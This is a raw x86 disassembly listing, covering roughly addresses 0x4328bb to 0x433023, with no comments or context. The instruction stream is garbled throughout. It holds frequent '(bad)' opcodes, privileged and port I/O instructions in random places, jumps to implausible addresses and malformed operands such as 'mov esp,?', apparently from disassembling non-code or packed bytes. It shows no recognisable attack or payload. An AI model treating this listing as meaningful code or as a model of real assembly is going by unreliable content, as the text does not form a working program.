  4328bb:	adc    DWORD PTR [ecx],esi
  4328bd:	pop    esi
  4328be:	inc    ecx
  4328bf:	leave  
  4328c0:	or     DWORD PTR [eax],ebx
  4328c2:	gs push ebp
  4328c4:	add    ah,ch
  4328c6:	into   
  4328c7:	in     al,dx
  4328c8:	enter  0xb756,0xf0
  4328cc:	push   cs
  4328cd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4328d7:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4328dd:	jnp    0x7443ade5
  4328e3:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4328e9:	add    BYTE PTR [edi],cl
  4328eb:	mov    edi,DWORD PTR [ecx-0x78]
  4328ee:	ltr    WORD PTR [ecx-0x7b]
  4328f2:	dec    DWORD PTR [edi]
  4328f4:	clc    
  4328f5:	out    0x45,eax
  4328f7:	add    BYTE PTR [eax],cl
  4328f9:	cmp    ebx,0xffffff8c
  4328fc:	jge    0x4328fe
  4328fe:	jb     0x432910
  432900:	je     0x522980
  432906:	pop    edx
  432907:	push   esi
  432908:	mov    ecx,DWORD PTR [edi]
  43290a:	in     al,dx
  43290b:	rol    DWORD PTR [ebp+0x0],1
  43290e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432915:	cmp    DWORD PTR [ecx],0xfffffff0
  432918:	hlt    
  432919:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43291f:	(bad)  
  432921:	push   eax
  432922:	jns    0xb8430da0
  432928:	lock push cs
  43292a:	ror    edx,0x3
  43292d:	test   BYTE PTR [ecx+0x5500e800],cl
  432933:	dec    eax
  432934:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  432938:	(bad)  
  432939:	mov    esi,0x7f33ff5f
  43293e:	inc    eax
  43293f:	test   DWORD PTR [edx],eax
  432941:	je     0x432903
  432943:	mov    ecx,ecx
  432945:	adc    DWORD PTR [ebp-0xc],0xffffffec
  432949:	and    eax,DWORD PTR [eax+0xf0103]
  43294f:	jp     0x43293d
  432951:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  432955:	add    edx,DWORD PTR [edi+0x74]
  432958:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43295e:	add    BYTE PTR [ebp-0x74c48bbb],al
  432964:	je     0x4328e9
  432966:	cmp    eax,edi
  432968:	js     0x43298d
  43296a:	add    eax,0xeb0fc003
  43296f:	jns    0x4328fc
  432971:	vmread DWORD PTR [ecx+0x45],ebx
  432975:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  43297b:	adc    al,0x8b
  43297d:	jge    0x432993
  43297f:	mov    edi,DWORD PTR [eax-0x4]
  432982:	add    edi,DWORD PTR [edi]
  432984:	or     bh,bh
  432986:	push   ebp
  432987:	push   es
  432988:	mov    DWORD PTR [ebp-0x4],ebx
  43298b:	add    edi,esi
  43298d:	pop    es
  43298e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432994:	mov    DWORD PTR [esp+esi*8],ecx
  432997:	inc    ebp
  432998:	pop    ebp
  432999:	xor    DWORD PTR [esi-0x4],0x3b
  43299d:	add    edx,DWORD PTR [ecx+edi*1]
  4329a0:	push   es
  4329a1:	clc    
  4329a2:	mov    bh,0xdb
  4329a4:	jp     0x43295d
  4329a6:	add    cl,BYTE PTR [esi]
  4329a8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4329ae:	test   edi,edi
  4329b0:	je     0x4329a6
  4329b2:	mov    eax,ecx
  4329b4:	or     BYTE PTR [ebx],al
  4329b6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4329bc:	jbe    0x432a30
  4329be:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4329c4:	add    ecx,DWORD PTR [esi]
  4329c6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4329cc:	add    eax,DWORD PTR [ebx-0x287af783]
  4329d2:	je     0x432a21
  4329d4:	mov    DWORD PTR [ecx],edi
  4329d6:	mov    esi,eax
  4329d8:	hlt    
  4329d9:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4329e0:	jb     0x4329a2
  4329e2:	jmp    0x4329cf
  4329e4:	xor    esi,DWORD PTR [ebx]
  4329e6:	pop    edi
  4329e7:	pop    esi
  4329e8:	pop    ebx
  4329e9:	ret    
  4329ea:	ret    0x8b
  4329ed:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4329f3:	xor    DWORD PTR [esi],0xc
  4329f6:	pushf  
  4329f7:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4329fd:	(bad)  
  4329ff:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432a06:	dec    ebp
  432a07:	ret    
  432a08:	mov    edi,DWORD PTR [esi-0x4]
  432a0b:	pop    eax
  432a0c:	dec    ebp
  432a0d:	jne    0x43299a
  432a0f:	xor    edi,esp
  432a11:	inc    eax
  432a12:	dec    ebp
  432a13:	jbe    0x432a68
  432a15:	inc    eax
  432a16:	pop    ebp
  432a17:	add    edx,DWORD PTR [esi+0x8]
  432a1a:	push   ecx
  432a1b:	dec    eax
  432a1c:	push   ecx
  432a1d:	mov    eax,edi
  432a1f:	and    al,0xf0
  432a21:	jo     0x432a0e
  432a23:	mov    eax,DWORD PTR [ebx]
  432a25:	sbb    BYTE PTR [ebp+0x4d],cl
  432a28:	mov    eax,DWORD PTR [ebx]
  432a2a:	nop
  432a2b:	or     BYTE PTR [eax],al
  432a2d:	jne    0x432a86
  432a2f:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432a35:	cld    
  432a36:	xor    edi,edi
  432a38:	add    edi,DWORD PTR [ebp+0x3]
  432a3b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432a41:	js     0x4329c7
  432a43:	jae    0x432a47
  432a45:	(bad)  
  432a47:	xor    al,0x5d
  432a49:	jmp    0x4329d6
  432a4b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432a52:	fdecstp 
  432a54:	test   BYTE PTR [edi],ah
  432a56:	add    bh,BYTE PTR [ebp+0x0]
  432a59:	add    ebx,DWORD PTR [ebp-0x77]
  432a5c:	mov    edi,eax
  432a5e:	cmp    al,0x0
  432a61:	adc    dh,BYTE PTR [ebx]
  432a63:	jge    0x432a68
  432a65:	mov    edi,DWORD PTR [ebx]
  432a67:	jl     0x432a78
  432a69:	clc    
  432a6a:	dec    edi
  432a6b:	jge    0x432a6d
  432a6d:	mov    eax,DWORD PTR [ebx]
  432a6f:	jb     0x432a79
  432a71:	mov    ecx,DWORD PTR [ebp-0x8]
  432a74:	mov    edi,edi
  432a76:	xor    edx,DWORD PTR [eax]
  432a78:	add    edi,DWORD PTR [ebx]
  432a7a:	mov    DWORD PTR [ebp-0x10],edi
  432a7d:	inc    edi
  432a7e:	pop    ebp
  432a7f:	jge    0x432abc
  432a81:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432a85:	mov    edx,0xc05d87f0
  432a8a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  432a8e:	fimul  WORD PTR [eax]
  432a90:	fist   WORD PTR [ebp+0x1c]
  432a93:	in     al,dx
  432a94:	jne    0x432a82
  432a96:	mov    edi,DWORD PTR [edx-0x7a27a10]
  432a9c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  432aa0:	fdivp  st(0),st
  432aa2:	fild   WORD PTR [ebp+0x4510f85c]
  432aa8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  432aae:	inc    ebp
  432aaf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  432ab5:	mov    ebp,DWORD PTR [ebx-0x4]
  432ab8:	adc    al,0x8b
  432aba:	rcl    DWORD PTR [eax],0x48
  432abd:	mov    esi,0x7080803
  432ac2:	fiadd  WORD PTR [ebp+0x4d]
  432ac5:	mov    WORD PTR [ebx+0x558bfc52],cs
  432acb:	cld    
  432acc:	xor    ebx,DWORD PTR [ebx+0x330103]
  432ad2:	mov    DWORD PTR [edi+0x872dc],edi
  432ad8:	xlat   BYTE PTR ds:[ebx]
  432ad9:	into   
  432ada:	ffreep st(6)
  432adc:	retf   0x6c7
  432adf:	iret   
  432ae0:	dec    ebp
  432ae1:	inc    ebp
  432ae2:	mov    DWORD PTR [ebx],edi
  432ae4:	fmul   QWORD PTR [edi]
  432ae6:	dec    ebp
  432ae7:	jnp    0x432b1c
  432ae9:	add    BYTE PTR [ebx],al
  432aeb:	mov    ecx,DWORD PTR [esp+edi*8]
  432aee:	inc    ebp
  432aef:	dec    ebp
  432af0:	lea    esi,[ebx]
  432af2:	add    DWORD PTR [ebx],eax
  432af4:	jb     0x432b31
  432af6:	add    BYTE PTR [edi],cl
  432af8:	inc    ebp
  432af9:	imul   eax,edi,0x858bd800
  432aff:	cld    
  432b00:	clc    
  432b01:	mov    DWORD PTR [ebp+0x0],eax
  432b04:	inc    DWORD PTR [eax]
  432b06:	or     al,0xde
  432b08:	sbb    bh,0x1
  432b0b:	retf   
  432b0c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432b13:	dec    ebp
  432b14:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432b1a:	enter  0x12de,0xdf
  432b1e:	inc    ebp
  432b1f:	pop    ebp
  432b20:	dec    DWORD PTR [ebx-0x257f0ff4]
  432b26:	add    DWORD PTR [edx],edx
  432b28:	add    BYTE PTR [ebp+0x50],dl
  432b2b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432b31:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432b37:	or     ah,al
  432b39:	pop    ss
  432b3a:	cdq    
  432b3b:	push   ebp
  432b3c:	clc    
  432b3d:	mov    eax,DWORD PTR [ebp-0x4]
  432b40:	xor    edx,edx
  432b42:	add    esi,DWORD PTR [ebx]
  432b44:	cmp    eax,DWORD PTR [ebx]
  432b46:	hlt    
  432b47:	cmp    DWORD PTR [ebx],esp
  432b49:	or     al,BYTE PTR [ebp+0xf]
  432b4c:	mov    eax,DWORD PTR [edx]
  432b4e:	loopne 0x432b50
  432b50:	(bad)  
  432b51:	mov    ecx,esi
  432b53:	cld    
  432b54:	pushf  
  432b55:	pop    ebp
  432b56:	cdq    
  432b57:	mov    esi,DWORD PTR [edx]
  432b59:	lock mov eax,eax
  432b5c:	adc    BYTE PTR [ebx],al
  432b5e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432b65:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432b6b:	dec    ebp
  432b6c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432b72:	(bad)  
  432b73:	iret   
  432b74:	inc    ebp
  432b75:	(bad)  
  432b76:	jne    0x432bc5
  432b78:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432b7e:	(bad)  
  432b7f:	cmp    ebx,eax
  432b81:	je     0x432b09
  432b83:	add    edi,edi
  432b85:	or     bh,bh
  432b87:	dec    ebp
  432b88:	inc    ebp
  432b89:	mov    esi,DWORD PTR [ebx]
  432b8b:	cld    
  432b8c:	add    ecx,esi
  432b8e:	cmp    ecx,DWORD PTR [eax-0xc]
  432b91:	mov    edx,DWORD PTR [edi]
  432b93:	or     BYTE PTR [ebp-0x7c],al
  432b96:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432b9c:	test   BYTE PTR [ecx+ebx*4],cl
  432b9f:	inc    ebp
  432ba0:	xor    bh,BYTE PTR ds:0x8be89c89
  432ba6:	out    dx,eax
  432ba7:	adc    BYTE PTR [eax],al
  432ba9:	jne    0x432b72
  432bab:	mov    ebp,esp
  432bad:	fcomp  DWORD PTR [ebx]
  432baf:	add    BYTE PTR [ecx],al
  432bb1:	inc    DWORD PTR [ebp-0x75]
  432bb4:	mov    esp,?
  432bb6:	add    al,0xce
  432bb8:	mov    ecx,edi
  432bba:	cld    
  432bbb:	inc    ebp
  432bbc:	fidivr WORD PTR [ebx]
  432bbe:	fbstp  TBYTE PTR [ebp-0x3e]
  432bc1:	mov    eax,DWORD PTR [eax]
  432bc3:	adc    BYTE PTR [ebx-0x3974038b],cl
  432bc9:	fadd   st,st(7)
  432bcb:	add    BYTE PTR [ebp-0x1],al
  432bce:	mov    ecx,DWORD PTR [esp+edi*8]
  432bd1:	inc    ebp
  432bd2:	mov    bh,0xc7
  432bd5:	loopne 0x432c1c
  432bd7:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432bdd:	add    DWORD PTR [ebx],esi
  432bdf:	pushf  
  432be0:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432be6:	mov    eax,edi
  432be8:	cwde   
  432be9:	inc    ebp
  432bea:	inc    ebp
  432beb:	jne    0x432b78
  432bed:	mov    esp,esp
  432bef:	clc    
  432bf0:	add    al,0x4d
  432bf2:	mov    DWORD PTR [ebx],esi
  432bf4:	or     al,0x33
  432bf6:	inc    ebp
  432bf7:	lea    ecx,[ebx-0x398d13fd]
  432bfd:	add    bh,al
  432bff:	inc    ebp
  432c00:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432c07:	add    ebp,esp
  432c09:	shufps xmm1,xmm3,0xc7
  432c0d:	(bad)  
  432c0e:	jmp    0x74886737
  432c13:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432c19:	hlt    
  432c1a:	mov    ecx,DWORD PTR [edi]
  432c1c:	fadd   DWORD PTR [ebp+0x0]
  432c1f:	xor    ecx,DWORD PTR [edi]
  432c21:	add    ecx,ecx
  432c23:	cmp    edi,edi
  432c25:	pmuludq mm7,QWORD PTR [edx+0x50]
  432c29:	(bad)  
  432c2a:	jmp    0x432bb7
  432c2c:	mov    edi,esp
  432c2e:	or     al,0xc6
  432c30:	inc    ebp
  432c31:	(bad)  
  432c32:	mov    eax,DWORD PTR [ebp+0x10]
  432c35:	jne    0x432bc0
  432c37:	mov    eax,DWORD PTR [ecx]
  432c39:	clc    
  432c3a:	add    BYTE PTR [ebp-0x40],cl
  432c3d:	xor    edx,DWORD PTR [eax-0x73]
  432c40:	jne    0x432c43
  432c42:	push   DWORD PTR [edx+0x8]
  432c45:	add    BYTE PTR [ebp+0x45],al
  432c48:	mov    ebp,ecx
  432c4a:	cld    
  432c4b:	add    BYTE PTR [ebp+0x0],cl
  432c4e:	xor    eax,DWORD PTR [ebp+0x3]
  432c51:	mov    ?,WORD PTR [ebx]
  432c53:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432c59:	sub    eax,0x5d330e4d
  432c5e:	lea    esi,[ebx]
  432c60:	add    DWORD PTR [ebx],eax
  432c62:	jb     0x432c4d
  432c64:	add    BYTE PTR [eax],al
  432c66:	inc    ebp
  432c67:	add    bl,ch
  432c69:	inc    ebp
  432c6a:	mov    esi,DWORD PTR [ebx]
  432c6c:	or     al,0x3
  432c6e:	(bad)  
  432c6f:	mov    edi,eax
  432c71:	in     al,dx
  432c72:	scas   eax,DWORD PTR es:[edi]
  432c73:	inc    ebp
  432c74:	mov    esi,DWORD PTR [ebx]
  432c76:	in     al,0x3
  432c78:	add    al,0x89
  432c7a:	mov    ecx,DWORD PTR [eax+edi*8]
  432c7d:	dec    ebp
  432c7e:	(bad)  
  432c7f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432c86:	mov    ecx,eax
  432c88:	cld    
  432c89:	push   es
  432c8a:	dec    ebp
  432c8b:	add    al,0x33
  432c8d:	mov    DWORD PTR [ebx],eax
  432c8f:	in     al,dx
  432c90:	cmp    DWORD PTR [ebp-0x67],eax
  432c93:	mov    eax,DWORD PTR [ebp-0xba0068]
  432c99:	mov    edx,DWORD PTR [ebp-0x4]
  432c9c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432c9f:	xor    eax,DWORD PTR [ebp+0x3]
  432ca2:	cmp    DWORD PTR [ebx],0x8b327498
  432ca8:	xor    edi,esp
  432caa:	jmp    0xff7729fc
  432caf:	add    ecx,DWORD PTR [ebp-0x3f]
  432cb2:	xor    ebx,DWORD PTR [edi]
  432cb4:	add    eax,ecx
  432cb6:	cmp    ebx,DWORD PTR [eax]
  432cb8:	mov    ecx,DWORD PTR [ebp-0x4]
  432cbb:	mov    ecx,DWORD PTR [eax]
  432cbd:	adc    BYTE PTR [ebp-0x80],al
  432cc0:	jmp    0x432cc3
  432cc2:	mov    eax,DWORD PTR [eax]
  432cc4:	cld    
  432cc5:	mov    bh,0xc6
  432cc7:	push   ecx
  432cc8:	(bad)  
  432cc9:	jne    0x432d29
  432ccb:	dec    ecx
  432ccd:	or     BYTE PTR [ecx+ebx*1],cl
  432cd0:	push   ebp
  432cd1:	inc    ebp
  432cd2:	in     al,dx
  432cd3:	add    ebp,esp
  432cd5:	or     bh,al
  432cd7:	dec    ebp
  432cd8:	cld    
  432cd9:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432cdf:	cmp    DWORD PTR [ecx],0x2
  432ce2:	pushf  
  432ce3:	dec    DWORD PTR [ebx+0x45510cf4]
  432ce9:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432cef:	mov    edx,DWORD PTR [ecx+0xc]
  432cf2:	xor    eax,esi
  432cf4:	mov    edx,0xc172c7
  432cf9:	inc    ebp
  432cfa:	mov    esi,DWORD PTR [ebp+0x8]
  432cfd:	mov    eax,edx
  432cff:	call   0x84c7f3f4
  432d04:	add    DWORD PTR [ecx-0x76bace00],ebx
  432d0a:	mov    ebp,eax
  432d0c:	or     BYTE PTR [eax],dl
  432d0e:	jo     0x432d5d
  432d10:	push   edi
  432d11:	xor    esi,DWORD PTR [ebp+0x3]
  432d14:	(bad)  
  432d15:	pmulhuw mm0,mm1
  432d18:	test   DWORD PTR [ebp-0x8],ecx
  432d1b:	mov    DWORD PTR [ebp-0x67],eax
  432d1e:	mov    eax,DWORD PTR [ebp-0x4]
  432d21:	xor    edi,DWORD PTR [ebp-0x73]
  432d24:	xor    eax,DWORD PTR [ebx]
  432d26:	xor    esi,DWORD PTR [edx+0x3]
  432d29:	add    BYTE PTR [ecx],bh
  432d2b:	inc    ebp
  432d2c:	(bad)  
  432d2d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432d33:	mov    DWORD PTR [eax],0x750f0004
  432d39:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432d3f:	lock add BYTE PTR [ebp+0x0],cl
  432d43:	mov    esi,DWORD PTR [ebp-0x18]
  432d46:	mov    ebp,edx
  432d48:	or     al,0x72
  432d4a:	ja     0x432d4c
  432d4c:	mov    edx,esi
  432d4e:	cld    
  432d4f:	(bad)  
  432d52:	cli    
  432d53:	mov    esi,DWORD PTR [ebp-0x4]
  432d56:	cmp    ecx,esi
  432d58:	bswap  edi
  432d5a:	(bad)
  432d5e:	mov    esi,DWORD PTR [ebp-0x4]
  432d61:	mov    esi,ecx
  432d63:	clc    
  432d64:	repnz add esi,DWORD PTR [ebp+0x45]
  432d68:	push   ebx
  432d69:	xor    eax,DWORD PTR [ebp+0x3]
  432d6c:	cmp    ebx,DWORD PTR [edi-0x64]
  432d6f:	pop    ebx
  432d70:	jmp    0x432e37
  432d75:	mov    esi,DWORD PTR [ebp-0x7d]
  432d78:	xor    ebp,DWORD PTR [eax]
  432d7a:	lea    eax,[ebp-0x8]
  432d7d:	ss repnz pushf 
  432d80:	out    dx,eax
  432d81:	(bad)  
  432d82:	neg    eax
  432d84:	ins    DWORD PTR es:[edi],dx
  432d85:	test   esi,edi
  432d87:	clc    
  432d88:	pop    esp
  432d89:	inc    ebp
  432d8a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432d90:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432d96:	add    cl,al
  432d98:	jne    0x432d33
  432d9a:	mov    esi,DWORD PTR [edx]
  432d9c:	in     al,dx
  432d9d:	push   esi
  432d9e:	xor    BYTE PTR [ebp-0xe],dh
  432da1:	add    edi,esi
  432da3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432da9:	add    cl,bh
  432dab:	mov    edi,DWORD PTR [ebp+0x8]
  432dae:	mov    DWORD PTR [ebp-0x14],esi
  432db1:	add    esi,DWORD PTR [ebp+0x3c]
  432db4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432dba:	mov    ah,0x3d
  432dbc:	cdq    
  432dbd:	pushf  
  432dbe:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432dc4:	jne    0x432d51
  432dc6:	mov    ecx,DWORD PTR [esp+ebp*8]
  432dc9:	icebp  
  432dca:	icebp  
  432dcb:	shl    edx,0xf2
  432dce:	(bad)  
  432dcf:	mov    ah,0x16
  432dd1:	inc    eax
  432dd2:	jne    0x432d67
  432dd4:	mov    ecx,DWORD PTR [edi]
  432dd6:	in     al,dx
  432dd7:	jmp    0x432dca
  432dd9:	add    dl,dh
  432ddb:	mov    edi,esi
  432ddd:	or     al,0x8
  432ddf:	inc    ebp
  432de0:	jne    0x432de5
  432de2:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432de8:	ret    
  432de9:	or     bh,bh
  432deb:	jge    0x432dd5
  432ded:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432df3:	xor    edi,eax
  432df5:	add    esi,DWORD PTR [ebp-0x77]
  432df8:	mov    ebx,esp
  432dfa:	clc    
  432dfb:	neg    DWORD PTR [ebp-0x7c]
  432dfe:	xor    eax,DWORD PTR [eax]
  432e00:	cmp    eax,DWORD PTR [eax]
  432e02:	repz jne 0x432d9a
  432e05:	xor    eax,DWORD PTR [ecx]
  432e07:	add    ebx,DWORD PTR [eax]
  432e09:	mov    DWORD PTR [ebp-0x8],eax
  432e0c:	mov    eax,edi
  432e0e:	cld    
  432e0f:	lock pop eax
  432e11:	test   DWORD PTR [ebx],esi
  432e13:	clc    
  432e14:	add    edx,DWORD PTR [edi-0x740bff77]
  432e1a:	fdivp  st(4),st
  432e1c:	test   ecx,esi
  432e1e:	(bad)  
  432e1f:	jnp    0x432e20
  432e21:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432e27:	jae    0x432db4
  432e29:	sub    edi,esp
  432e2b:	(bad)  
  432e2c:	shl    DWORD PTR [eax-0x3e],0x89
  432e30:	leave  
  432e31:	call   0x8198e53e
  432e36:	in     al,dx
  432e37:	(bad)  
  432e38:	in     al,dx
  432e39:	add    bh,al
  432e3b:	mov    esp,edi
  432e3d:	in     al,dx
  432e3e:	test   DWORD PTR [ebp-0x8],edi
  432e41:	mov    eax,DWORD PTR [ebp+0x2b]
  432e44:	cmp    DWORD PTR [ebx],eax
  432e46:	pushf  
  432e47:	jnp    0x57322a80
  432e4d:	xor    edx,DWORD PTR [ecx-0x77]
  432e50:	push   ecx
  432e51:	loopne 0x432e86
  432e53:	jne    0x432e10
  432e55:	mov    esi,DWORD PTR [edx-0x20]
  432e58:	add    BYTE PTR [ebp-0x3d],bh
  432e5b:	xor    eax,DWORD PTR [ebp-0x73]
  432e5e:	mov    edi,DWORD PTR [esi]
  432e60:	cld    
  432e61:	jb     0x432e29
  432e63:	add    bl,al
  432e65:	jne    0x432eac
  432e67:	mov    edx,DWORD PTR [edi-0x10]
  432e6a:	jge    0x432ee9
  432e6c:	mov    esi,DWORD PTR [ebx]
  432e6e:	lock add ecx,DWORD PTR [ebp+0x3b]
  432e72:	xor    esi,DWORD PTR [ebp-0x77]
  432e75:	mov    esi,eax
  432e77:	lock inc ebp
  432e79:	jge    0x432eb1
  432e7b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432e82:	dec    ebp
  432e83:	mov    esi,DWORD PTR [ebx]
  432e85:	loopne 0x432e10
  432e87:	jge    0x432e81
  432e89:	add    DWORD PTR [ebp-0x7d],eax
  432e8c:	test   BYTE PTR [edx],0x9c
  432e8f:	dec    ebp
  432e90:	mov    esi,DWORD PTR [ebp-0xc]
  432e93:	mov    ecx,DWORD PTR [ebp-0xc]
  432e96:	xor    ebx,DWORD PTR [ebp-0x77]
  432e99:	mov    esi,esp
  432e9b:	in     al,0x45
  432e9d:	jge    0x432ed9
  432e9f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432ea6:	dec    ebp
  432ea7:	inc    esp
  432ea8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432eae:	inc    ebp
  432eaf:	hlt    
  432eb0:	ss jne 0x432e52
  432eb3:	mov    edi,DWORD PTR [eax+0xf19504]
  432eb9:	repnz mov DWORD PTR [ebp+0x20],ebx
  432ebd:	cmp    eax,DWORD PTR [ebp+0xf]
  432ec0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432ec4:	fistp  WORD PTR [ebx+0x0]
  432ec7:	inc    ebp
  432ec8:	mov    ebx,DWORD PTR [edi+0xc]
  432ecb:	add    eax,eax
  432ecd:	inc    ebp
  432ece:	test   BYTE PTR [ebx],dh
  432ed0:	add    eax,DWORD PTR [ebx]
  432ed2:	add    BYTE PTR [esi+0x45],bl
  432ed5:	ret    0x85
  432ed8:	jnp    0x5443b2a7
  432ede:	inc    bp
  432ee0:	inc    ebp
  432ee1:	ss mov ecx,0xc78a9c
  432ee7:	fdiv   QWORD PTR [ebx]
  432ee9:	test   DWORD PTR [ecx+0x453af8],edi
  432eef:	push   ebx
  432ef0:	add    edi,DWORD PTR [esi+0x708088b]
  432ef6:	cmp    esi,eax
  432ef8:	setns  BYTE PTR [ecx-0x74fcffce]
  432eff:	mov    esp,edi
  432f01:	call   0x33ce7453
  432f06:	or     BYTE PTR [ebx],al
  432f08:	inc    ecx
  432f09:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432f0f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432f15:	lock add cl,al
  432f18:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432f1f:	mov    ch,0x45
  432f21:	clc    
  432f22:	xor    eax,DWORD PTR [ebp+0x3]
  432f25:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432f2b:	inc    ebp
  432f2c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432f32:	mov    edi,eax
  432f34:	mov    eax,DWORD PTR [ebp+0x3c]
  432f37:	mov    ecx,DWORD PTR [eax]
  432f39:	hlt    
  432f3a:	inc    ebp
  432f3b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432f42:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432f48:	push   ebp
  432f49:	mov    edi,DWORD PTR [ebx]
  432f4b:	in     al,dx
  432f4c:	jne    0x432f0f
  432f4e:	mov    eax,DWORD PTR [ebp-0x28]
  432f51:	add    DWORD PTR [eax],0xe8058dec
  432f57:	clc    
  432f58:	mov    esi,DWORD PTR [edi-0x8]
  432f5b:	add    dh,dl
  432f5d:	rol    WORD PTR [ebp-0x1],cl
  432f61:	mov    edx,DWORD PTR [eax+0x8]
  432f64:	jne    0x432f26
  432f66:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432f6d:	inc    ebp
  432f6e:	push   esp
  432f6f:	test   DWORD PTR [ecx+0xf],ecx
  432f72:	sub    edx,esp
  432f74:	add    eax,DWORD PTR [eax]
  432f76:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432f7c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432f83:	mov    eax,DWORD PTR [ecx]
  432f85:	and    BYTE PTR [eax],al
  432f87:	cmp    BYTE PTR [eax],dl
  432f89:	add    BYTE PTR [ebp+0x66],al
  432f8c:	inc    ecx
  432f8e:	push   esp
  432f8f:	(bad)  
  432f90:	jne    0x432f92
  432f92:	push   edx
  432f93:	enterw 0xc1,0x4d
  432f98:	mov    esp,DWORD PTR [esi+0x20]
  432f9b:	add    DWORD PTR [ecx-0x7b],eax
  432f9e:	add    eax,DWORD PTR [ebx]
  432fa0:	str    WORD PTR [eax+0x45]
  432fa4:	lea    ecx,[ebx+0x45890801]
  432faa:	sbb    BYTE PTR [ebx],al
  432fac:	dec    ebp
  432fad:	cmp    al,0xf
  432faf:	inc    ebp
  432fb0:	push   eax
  432fb1:	mov    esi,DWORD PTR [ebx]
  432fb3:	push   eax
  432fb4:	add    eax,eax
  432fb6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432fbd:	inc    ebp
  432fbe:	add    BYTE PTR [esi],dh
  432fc0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432fc7:	(bad)  
  432fc8:	mov    ebx,eax
  432fca:	loopne 0x433011
  432fcc:	dec    ebp
  432fcd:	mov    ecx,DWORD PTR [edi]
  432fcf:	cld    
  432fd0:	push   eax
  432fd1:	xchg   DWORD PTR [ebx],esi
  432fd3:	add    DWORD PTR [ebx],ebp
  432fd5:	add    BYTE PTR [ebx],ch
  432fd7:	or     BYTE PTR [ecx],bh
  432fd9:	dec    ecx
  432fda:	loopne 0x432fdf
  432fdc:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432fe2:	push   ebp
  432fe3:	add    DWORD PTR [ebx+0x55100800],eax
  432fe9:	dec    ebp
  432fea:	jmp    0x432f75
  432fec:	mov    esp,DWORD PTR [eax]
  432fee:	sbb    dl,dl
  432ff0:	inc    eax
  432ff1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432ff7:	add    BYTE PTR [ebx+0x74528555],cl
  432ffd:	push   ebp
  432ffe:	div    DWORD PTR [ebx]
  433000:	and    eax,DWORD PTR [ebx]
  433002:	add    edx,DWORD PTR [edx-0x30]
  433005:	jno    0x432f92
  433007:	inc    DWORD PTR [eax+eiz*1]
  43300a:	inc    ebp
  43300b:	push   eax
  43300c:	push   eax
  43300d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  433013:	mov    edi,esp
  433015:	push   eax
  433016:	inc    ebp
  433017:	enter  0x458b,0x8
  43301b:	push   ecx
  43301c:	(bad)  
  43301d:	call   0x10d39f5
  433022:	pop    ss
  433023:	push   ebp
